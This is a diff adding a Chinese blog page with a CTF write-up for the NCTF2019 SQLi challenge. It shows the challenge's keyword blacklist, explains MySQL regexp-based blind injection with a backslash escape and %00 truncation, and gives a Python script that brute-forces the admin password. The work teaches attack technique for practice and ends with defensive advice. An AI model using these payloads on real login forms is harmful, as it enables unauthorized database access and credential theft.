@@ -1,0 +1,534 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="一道入门的正则注入类型的Sql Injection,知识点不多,题也很简单,但是在做题过程中中也会遇到很多坑写这边文章的目的是希望能在巩固自身知识点的基础上,也能够对你有一定的帮助和启发">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>NCTF2019SQLi - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="NCTF2019SQLi">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-18 03:54" pubdate>
+        2021年7月18日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">NCTF2019SQLi</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：3 小时前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>一道入门的正则注入类型的<code>Sql Injection</code>,知识点不多,题也很简单,但是在做题过程中中也会遇到很多坑<br>写这边文章的目的是希望能在巩固自身知识点的基础上,也能够对你有一定的帮助和启发</p>
+<span id="more"></span>
+
+
+
+<h1 id="一道题入门正则注入"><a href="#一道题入门正则注入" class="headerlink" title="一道题入门正则注入"></a>一道题入门正则注入</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NCTF2019]SQLi">https://buuoj.cn/challenges#[NCTF2019]SQLi</a></p>
+<h2 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>二话不说，拿到题干的第一件事就是信息搜集。</p>
+<p>先扫下目录</p>
+<p>能发现存在robots.txt</p>
+<p>访问一下 </p>
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718183353901.png" srcset="/img/loading.gif" lazyload alt="image-20210718183353901"></p>
+<p>可以看到存在一个hint.txt</p>
+<p>看下hint.txt</p>
+<p>发现存在以下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><span class="hljs-keyword">If</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure>
+
+<p>看样子这题类型基本属于 <code>SQL Injection</code>.</p>
+<p>可以看到黑名单里过滤了较多的关键字</p>
+<p>不过报错注入关键字<code>extractvalue</code> 和<code>updatexml</code> 没有过滤</p>
+<p>在首页可以看到出题者给的查询语句</p>
+<p>不过在简单尝试之后  发现题目没有任何报错回显,于是放弃报错注入.</p>
+<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p> 再次使用sql注入常见的字符语句fuzzing下,发现黑名单还是存在很大漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*</span><br><span class="hljs-comment">比如字符 	; \ ^ | (xxxx内容) &amp; &quot; *  等等没有过滤</span><br><span class="hljs-comment">关键字      regexp update delete prepare version        等等没有过滤</span><br><span class="hljs-comment">     </span><br></code></pre></td></tr></table></figure>
+
+<p>而今天要介绍的就是 regexp 正则注入</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>原理很简单,就是利用 Mysql 的 regexp 正则匹配 逐字匹配内容</p>
+<p>举个例子:</p>
+<p>现在存在以下结构的表:</p>
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718121959033.png" srcset="/img/loading.gif" lazyload alt="image-20210718121959033"></p>
+<p><code>Mysql</code> 正则的使用姿势</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where username regexp &quot;^d&quot;;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718122051027.png" srcset="/img/loading.gif" lazyload alt="image-20210718122051027"></p>
+<p>其中 <code>&quot;^d&quot;</code>  表示匹配以 <code>字符d</code>  开头的内容</p>
+<p>同样, MySQL 中 <code>like</code> 关键字也能实现相同的功能,如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where username like &quot;d%&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718122321804.png" srcset="/img/loading.gif" lazyload alt="image-20210718122321804"></p>
+<p>不同之处在于 like 中 <code>%</code> 的用法类似于 <code>*</code> ,用来表示匹配任意字符</p>
+<p><code>like &quot;d%&quot;</code> 同样表示匹配以 <code>字符d</code> 开头的内容</p>
+<p>不过由上两个例子我们不难发现, <code>regexp</code>和<code>like</code>都有个缺点,便是<strong>无法区分大小写,</strong></p>
+<p>为了使得 <code>regexp</code> 以及<code>like</code>能够区分匹配大小写 这里就需要使用 <code>binary</code> 关键子</p>
+<p>其用法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysq">select * from users where username regexp binary &quot;^d&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718122808623.png" srcset="/img/loading.gif" lazyload alt="image-20210718122808623"></p>
+<p>可以看到 我们现在只匹配到了 以小写 <code>d</code> 开头的内容</p>
+<p>同理 <code>like</code> 使用 <code>binary</code>的用法如下:</p>
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718122857462.png" srcset="/img/loading.gif" lazyload alt="image-20210718122857462"></p>
+<h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>有了<code>regexp</code>的理论姿势之后,便能开始解题了</p>
+<p>回到本题,</p>
+<p>在首页可以看到我们构造的 <code>sql</code>语句</p>
+<p><img src="/images/2021-07-18-NCTF2019SQLi/image-20210718123210671.png" srcset="/img/loading.gif" lazyload alt="image-20210718123210671"></p>
+<p>猜测后端语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$_POST</span>[\&#x27;username\&#x27;]&#x27; and passwd=&#x27;<span class="hljs-subst">$_POST</span>[\&#x27;passwd\&#x27;]&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>由于没有过滤 <code>\</code>,于是我们可以在<code>username</code> 处传入<code>\</code> 使得<code>$_POST[&#39;passwd&#39;]</code> 传入的参数暴露来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#传入 username=\&amp;passwd=123 于是 sql语句 就变为了<br>select * from users where username=&#x27;\&#x27; and passwd=&#x27;123&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到 <code>123&#39;</code> 就从sql语句中逃逸了出来</p>
+<p>此时使用 <code>||</code> 或语句,结合<code>regexp</code>正则注入,逐位匹配 <code>passwd</code> 字符就能得到 <code>passwd</code>全部内容.</p>
+<p>由于空格被过滤 观察未过滤字符,此处我们可以使用 <code>(xx内容)</code>或者<code>/**/</code>绕过</p>
+<p>这里我选择使用<code>()</code>,构造如下语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||(passwd)regexp(&quot;^&#123;&#125;&quot;);&#x27; <br># 其中爆破字符填充在 &#123;&#125; 内<br></code></pre></td></tr></table></figure>
+
+<p>还没完 这样构造后会发现有个 <code>&#39;</code> 留在外面,会导致我们的语句报错,所以得想办法,要么把<code>&#39;</code>闭合,要么把<code>&#39;</code>截断,</p>
+<p>这里我们使用 <code>%00</code> 将其截断</p>
+<p>完整payload 构造如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||(passwd)regexp(&quot;^&#123;&#125;&quot;);%00&#x27; <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意: 看文章有人说 %00 是用来截断 url 的.很明显不对,这里%00 是用来截断后面 单引号 的 </p>
+</blockquote>
+<p>但是前面 黑名单里面存在 <code>%00</code> 为什么这里又能使用 <code>%00</code> 来截断?</p>
+<p>通过测试 发现, <code>Post</code> 提交的数据经过了 <code>urlencode</code>, 如果我们提交<code>%00</code>,urlencode后的值<code>%2500</code> 会出现错误,但是提交原数据<code>%00</code>便不会被过滤,猜测后端对接收到的数据进行了一次 <code>urldecoe</code> 再判断是否存在黑名单的字符,所以后面编写payload 程序时,需要注意<code>%00</code> 传递因该是源数据,不需要也不能进行<code> urlencode</code></p>
+<h3 id="完整Payload"><a href="#完整Payload" class="headerlink" title="完整Payload"></a>完整Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsimport stringimport timefrom urllib <span class="hljs-keyword">import</span> parsefrom fake_useragent <span class="hljs-keyword">import</span> UserAgentheaders =&#123;<span class="hljs-string">&#x27;User-agent&#x27;</span>:UserAgent().random&#125;string_list = string.ascii_lowercase + string.digits +  <span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-comment">#print(string_list)url = &#x27;http://b645bc84-cd16-434e-8667-5cfeb6e37eb4.node4.buuoj.cn/index.php&#x27;password = &#x27;&#x27;while True:	for i in string_list:		data = &#123;			&quot;username&quot;: &quot;\\&quot;,			&quot;passwd&quot;:&#x27;||(passwd)regexp(&quot;^&#123;0&#125;&quot;);&#123;1&#125;&#x27;.format((password + i), parse.unquote(&#x27;%00&#x27;))		&#125;		r = requests.post(url,headers=headers,data=data)		#print(i,&#x27;------&gt;&#x27;,r.status_code)		if r.status_code == 404:			password += i			print(password)			continue		time.sleep(0.5)		if i ==&#x27;_&#x27;:			break</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>基于正则表达式的新注入姿势,需要关键子  <code>regexp</code> 或<code>like</code>,如果查询的内容需要对大小写还需要使用<code>binary</code></li>
+<li>对于开发而言,为了避免用户恶意传入,应使用白名单而不是黑名单</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/sqli/">sqli</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/">正则注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/18/SqlInjection-summary/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Sql Injection_summary</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/17/0ctf2016piapiapia/">
+                        <span class="hidden-mobile">0ctf2016piapiapia</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
